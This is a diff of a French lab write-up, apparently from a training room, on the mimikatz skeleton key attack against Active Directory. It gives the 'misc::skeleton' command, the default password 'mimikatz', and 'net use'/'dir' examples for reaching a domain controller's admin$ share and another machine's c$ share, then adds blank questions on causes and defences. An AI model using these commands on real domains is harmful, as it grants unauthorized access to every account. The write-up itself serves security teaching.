@@ -26,13 +26,13 @@ Le contrôleur de domaine essaie ensuite de déchiffrer cet horodatage avec le h
 
 
 
-Installation de la clé squelette avec mimikatz -
+**Installation de la clé squelette avec mimikatz **
 
 1.) ```misc::skeleton``` - Oui ! c'est tout, mais ne sous-estimez pas cette petite commande elle est très puissante ☠️
 
 
 
-**Accéder à la forêt** -
+**Accéder à la forêt** 
 
 Les identifiants par défaut seront : "mimikatz"
 
@@ -41,3 +41,15 @@ exemple : ```net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz``
 exemple : ```dir \\Desktop-1\c$ /user:Machine1 mimikatz``` - accéder au répertoire de Desktop-1 sans jamais savoir quels utilisateurs ont accès à Desktop-1
 
 La clé squelette ne persistera pas par elle-même car elle s'exécute dans la mémoire, elle peut être scriptée ou persistée à l'aide d'autres outils et techniques, mais cela est hors de portée pour cette pièce.
+
+**Répondez aux questions** 
+
+Qu'est ce qui rend une telle attaque possible ?
+```
+reponse
+```
+
+Comment pourrait-on s'en protéger et l'empêcher ?
+```
+reponse
+```
